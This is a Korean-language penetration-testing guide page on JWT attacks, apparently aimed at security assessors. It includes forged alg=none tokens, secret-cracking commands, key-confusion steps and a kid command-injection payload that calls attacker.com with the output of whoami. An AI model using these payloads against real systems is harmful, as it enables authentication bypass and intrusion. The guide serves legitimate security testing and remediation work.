---
sidebar_position: 30
title: JWT Attacks
description: 웹 진단 - JWT alg=none, HS/RS key confusion, kid injection, JWK 헤더 주입, 약한 시크릿 brute, 판정 기준
keywords: [JWT, JSON Web Token, alg none, HS256, RS256, kid injection, JWK Injection, Key Confusion, jwt_tool, OWASP A07]
draft: false
---

# JWT 공격
> JWT 의 서명 검증 / 알고리즘 처리 / 헤더 파라미터 처리 결함을 이용해 **토큰 위조** → 임의 사용자 / 관리자 권한 획득.
> 단일 결함으로 인증 우회 + 권한 상승이 동시에 가능해 즉시 Critical.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A07:2025 - Identification and Authentication Failures / KISA 인증 |
| **CWE** | [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html), [CWE-345: Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html) |
| **영향도** | 🔴 매우 높음 (인증 우회 + 권한 상승) |
| **점검 난이도** | 중 (alg=none / kid injection) / 상 (RS→HS confusion / 약한 시크릿 brute) |
| **예상 점검 시간** | 1 ~ 4시간 |

---

## 점검 목적

JWT 토큰의 **서명 검증 로직** 이 안전한지 확인한다. JWT 의 구조 (`header.payload.signature`) 자체는 표준이지만, 실제 구현체의 서명 검증이 누락되거나 (`alg: none`), 알고리즘을 클라이언트가 결정하거나 (key confusion), 헤더 파라미터 (`kid`, `jku`, `jwk`) 가 신뢰 없이 처리되면 토큰을 임의 위조 가능.

> **다른 페이지와 영역 분리**
> - 인증 자체 (로그인 / 사용자 열거 / MFA 우회) → `authentication.md`
> - 세션 / 쿠키 속성 → `session-management.md`. JWT 가 쿠키에 담긴 경우 쿠키 속성은 그쪽 영역
> - OAuth `redirect_uri` 우회 → `open-redirect.md` 케이스 6
> - 인가 / IDOR → `authorization-idor.md`. JWT 가 위조 가능하면 권한 결함의 근본 원인이 됨

---

## 유형 구분

| 유형 | 핵심 |
| :--- | :--- |
| **`alg: none` 우회** | 헤더의 `alg` 를 `none` 으로 변조 → 서명 자체를 검증 안 함 |
| **약한 HMAC 시크릿** | HS256 의 시크릿이 짧거나 사전 단어 → brute / dictionary |
| **알고리즘 혼동 (HS/RS Key Confusion)** | RS256 환경에서 `alg: HS256` 으로 변조 + 공개키를 HMAC 시크릿으로 사용 |
| **`kid` 헤더 인젝션** | `kid` 가 파일 경로 / SQL 쿼리에 사용되면 path traversal / SQLi 로 검증 키 변조 |
| **`jku` / `jwk` 헤더** | 공격자 제어 URL 의 키 / 헤더 내 임베드 키를 사용해 검증 |
| **만료 / 클레임 검증 미흡** | `exp` / `iat` / `iss` / `aud` 누락 검증 |
| **정보 노출 (페이로드 평문)** | JWT 페이로드는 평문 — 민감 정보 포함되면 결함 |

---

## 진단 절차

### Step 1. JWT 식별 + 디코딩

```bash
# 토큰 추출
# 형식: eyJhbGciOiJIUzI1NiIs...3개 부분.으로 구분.

# 디코딩
echo '<TOKEN>' | jwt_tool -

# 또는 수동 base64url 디코딩
echo '<header>' | base64 -d
echo '<payload>' | base64 -d
```

### Step 2. 헤더 / 페이로드 분석

확인 항목:

```
[헤더]
- alg: HS256 / RS256 / ES256 / none
- typ: JWT
- kid: 키 식별자 (있으면 인젝션 시도 대상)
- jku: JWK Set URL (있으면 우회 대상)
- jwk: 임베드 키 (있으면 우회 대상)

[페이로드]
- sub / user_id: 사용자 식별자
- role / scope: 권한 정보 ← 변조 시도 대상
- iss / aud: 발급자 / 대상
- iat / exp: 발급 / 만료 시간
- 민감 정보 포함 여부 (이메일, 휴대폰, 주민번호 등)
```

### Step 3. 공격 시도

케이스 1~6 의 각 패턴 시도.

### Step 4. 위조 토큰으로 영향 입증

- `user_id` / `sub` 를 다른 사용자로 변조 → 다른 사용자 권한
- `role: admin` 으로 변조 → 관리자 권한
- 만료된 토큰 변조 후 통과 시도

---

## 페이로드 / 테스트 케이스

### 케이스 1: `alg: none` 우회
**언제 쓰는지**: 모든 JWT 점검의 첫 시도. 일부 구현체 (특히 옛 라이브러리) 가 `alg: none` 을 그대로 수용.

**시도 단계:**

```
1. 헤더의 alg 를 "none" 으로 변경
2. payload 의 user_id / role 변조
3. signature 부분을 빈 문자열로
4. 토큰 형태: <header>.<payload>.    ← 마지막 . 다음에 빈 문자열
```

**예시 변조:**

```bash
# 원본
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjQyLCJyb2xlIjoidXNlciJ9.<sig>

# 디코딩
{"alg":"HS256","typ":"JWT"}.{"sub":42,"role":"user"}.<sig>

# 변조 → alg=none + role=admin + signature 없음
{"alg":"none","typ":"JWT"}.{"sub":1,"role":"admin"}.

# 재인코딩
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiJ9.

# 변형도 시도
{"alg":"None"} {"alg":"NONE"} {"alg":"nOnE"}
{"alg":""}     {"alg":null}
```

**판정**: 위 변조 토큰이 정상 인증 통과 (200 OK + 관리자 권한 응답) 하면 즉시 Critical. 모든 JWT 라이브러리는 `alg: none` 을 거부해야 정상.

### 케이스 2: 약한 HMAC 시크릿
**언제 쓰는지**: `alg: HS256` 인 토큰. 시크릿이 짧거나 사전 단어면 오프라인 brute 가능.

**`jwt_tool` 또는 `hashcat`:**

```bash
# jwt_tool 내장 사전
python3 jwt_tool.py <TOKEN> -C -d /path/to/wordlist.txt

# hashcat
hashcat -a 0 -m 16500 <TOKEN> wordlist.txt
hashcat -a 3 -m 16500 <TOKEN> ?l?l?l?l?l?l?l?l        # 무차별 8자 소문자

# 일반 wordlist
SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
rockyou.txt
```

**탐지 시그널:**

```
[+] Secret found: secret
[+] Secret found: password123
[+] Secret found: jwtsecret
[+] Secret found: changeme
```

**판정**: 시크릿이 발견되면 임의 페이로드로 정상 서명 토큰 생성 가능 → Critical. **GitHub 등 공개 저장소에서 시크릿이 함께 노출** 되어 있으면 brute 도 불필요.

### 케이스 3: 알고리즘 혼동
**언제 쓰는지**: 원본 토큰이 `alg: RS256` 이고, 서버가 공개키로 검증하는 환경. 공개키를 어떻게든 획득할 수 있을 때 (보통 `/.well-known/jwks.json` / `/api/keys` / OIDC 표준 엔드포인트).

**원리:**

```
정상: RS256 → 비밀키로 서명, 공개키로 검증
공격: alg 를 HS256 로 변조 → 서버가 "공개키" 를 HMAC 시크릿으로 사용
       → 공개키를 시크릿으로 사용해 HS256 서명 생성하면 검증 통과
```

**시도 단계:**

```bash
# 1. 공개키 획득
curl https://<TARGET>/.well-known/jwks.json
# 또는
curl https://<TARGET>/api/keys

# 응답 (JWK 형식):
# {"keys":[{"kty":"RSA","n":"...","e":"AQAB","kid":"key1"}]}

# 2. JWK → PEM 변환
python3 jwt_tool.py <TOKEN> -X k -pk public.pem

# 3. 변조 토큰 생성
python3 jwt_tool.py <TOKEN> -X k \
  -pk public.pem \
  -I -pc "role" -pv "admin"

# 결과: alg=HS256 + 공개키를 HMAC 시크릿으로 서명한 토큰
```

**판정**: 변조 토큰이 인증 통과하면 RS/HS confusion 취약. 옛 jsonwebtoken 라이브러리 (Node.js) / 일부 PyJWT 버전 등에서 발견.

### 케이스 4: `kid` 헤더 인젝션

**언제 쓰는지**: 헤더에 `kid` (Key ID) 파라미터가 있을 때. 서버가 `kid` 값으로 키를 조회하는 패턴인데 입력 검증이 부실한 경우.

**4-1. Path Traversal:**

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"
}
```

서버가 `kid` 를 파일 경로로 사용 + `/dev/null` 을 키로 읽음 → 키 = 빈 문자열 → 빈 시크릿으로 서명한 토큰이 통과.

**4-2. SQL Injection:**

```json
{
  "kid": "key1' UNION SELECT 'mysecret"
}
```

`kid` 가 SQL 쿼리 (`SELECT key FROM keys WHERE id = '<kid>'`) 에 사용되면 UNION 으로 임의 시크릿 주입.

**4-3. Command Injection:**

```json
{
  "kid": "key1|curl https://attacker.com/$(whoami)"
}
```

`kid` 가 shell 명령에 사용되는 흐름 (드물지만 존재) 에서 RCE.

**판정**: 위 변형 중 하나로 위조 토큰이 통과되면 `kid` 검증 결함 → Critical.

### 케이스 5: `jku` / `jwk` 헤더
**언제 쓰는지**: 헤더에 `jku` (JWK Set URL) 또는 `jwk` (임베드 키) 가 있고, 서버가 이를 신뢰 없이 사용.

**5-1. `jku` — 공격자 호스팅 JWK URL:**

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json"
}
```

공격자가 `https://attacker.com/jwks.json` 에 본인의 공개키를 호스팅 + 본인 비밀키로 토큰 서명 → 서버가 그 URL 에서 키 다운로드 + 검증 통과.

**5-2. `jwk` — 헤더 내 임베드 키:**

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {"kty":"RSA","n":"<attacker_pub_n>","e":"AQAB"}
}
```

공격자 공개키를 헤더에 직접 임베드 → 서버가 그 키로 검증 → 통과.

**5-3. `x5u` / `x5c`** — 인증서 URL / 임베드 인증서. 동일한 패턴.

**판정**: 위 변형 중 하나로 임의 토큰 위조 가능 → Critical. RFC 7515 는 `jku` / `jwk` / `x5u` 사용 시 발급자 / 허용 도메인 검증을 명시하지만, 실제 구현이 누락된 경우가 흔함.

### 케이스 6: 클레임 검증 미흡
**언제 쓰는지**: 위조 자체는 못 해도 만료 / 발급자 / 대상 검증 누락 가능성.

**시나리오:**

```
1. 만료된 토큰 (exp 가 과거) 그대로 전송 → 인증 통과?
2. 다른 환경 (개발 / 스테이징) 의 발급자 (iss) 토큰을 운영에서 사용 → 통과?
3. 다른 클라이언트 (aud) 의 토큰을 사용 → 통과?
4. nbf (Not Before) 누락 → 미래 토큰 인증 통과?
```

**판정**: 만료 / 발급자 / 대상 검증이 누락되면 Medium ~ High. 단일 결함은 작지만 다른 결함과 결합 시 임팩트 상향.

### 케이스 7: 페이로드 평문 정보 노출

**언제 쓰는지**: JWT 페이로드는 base64url 디코딩만으로 평문 노출. 민감 정보 포함 여부 점검.

```bash
echo '<jwt_payload>' | base64 -d | jq

# 흔한 노출 항목
{
  "sub": "user@example.com",
  "phone": "010-1234-5678",
  "national_id": "900101-1234567",        ← 주민번호
  "credit_card_last4": "1234",
  "internal_user_id": "EMP-99988",
  "permissions": [...]
}
```

**판정**: 민감 정보 (주민번호, 카드, 내부 ID) 가 페이로드에 평문 노출 → Medium ~ High (개인정보보호법 영역). JWT 는 인증용이지 비밀 데이터 컨테이너가 아님.

### 그 외 — 한 줄 언급만

- **JWE (JSON Web Encryption)** — 페이로드 암호화 토큰. 알고리즘 confusion / key 결함은 유사하지만 빈도 낮음
- **PS256 / ES256 등 다른 알고리즘** — 검증 로직 우회 패턴은 RS256 과 유사
- **Refresh Token Replay** — Refresh Token 이 무효화 안 되는 결함. `authentication.md` 와 영역 겹침
- **OIDC `id_token` 변조** — JWT 결함의 한 형태. 동일 패턴 적용

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] `alg: none` 변조 토큰이 인증 통과
- [ ] HS256 시크릿이 brute / wordlist 로 발견됨
- [ ] RS→HS Key Confusion (공개키를 시크릿으로 사용) 변조 토큰 통과
- [ ] `kid` 헤더 인젝션 (path traversal / SQLi) 으로 위조 토큰 통과
- [ ] `jku` / `jwk` 헤더로 공격자 키 사용한 위조 토큰 통과
- [ ] 만료 (`exp`) / 발급자 (`iss`) / 대상 (`aud`) 검증 누락
- [ ] 페이로드에 주민번호 / 카드 정보 등 민감 정보 평문 노출

**오탐 주의:**

- [ ] `alg: none` 시도가 거부되면 (401 / 400) 정상. 응답 본문에 "invalid algorithm" 등 메시지 확인
- [ ] HS256 brute 는 시크릿이 강하면 (32바이트 이상 랜덤) 사실상 불가능 — 안전 설정
- [ ] `kid` 가 있다고 무조건 인젝션 가능한 건 아님 — 응답 차이 / 에러 확인
- [ ] `jku` 사용은 일부 환경에서 정상 (OIDC discovery) — 도메인 화이트리스트가 적용되어 있는지 확인
- [ ] 만료된 토큰을 받아도 자동으로 갱신해서 응답하는 흐름은 정상일 수 있음 (Silent refresh)

---

## 참고자료

- [OWASP - JSON Web Token Cheat Sheet for Java](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger - JWT attacks](https://portswigger.net/web-security/jwt)
- [PortSwigger - JWT algorithm confusion attacks](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [jwt.io - JWT debugger](https://jwt.io/)
- [jwt_tool GitHub](https://github.com/ticarpi/jwt_tool)
- [PayloadsAllTheThings - JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
- [HackTricks - JWT Attacks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
- [RFC 7519 - JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)
- [RFC 8725 - JSON Web Token Best Current Practices](https://datatracker.ietf.org/doc/html/rfc8725)
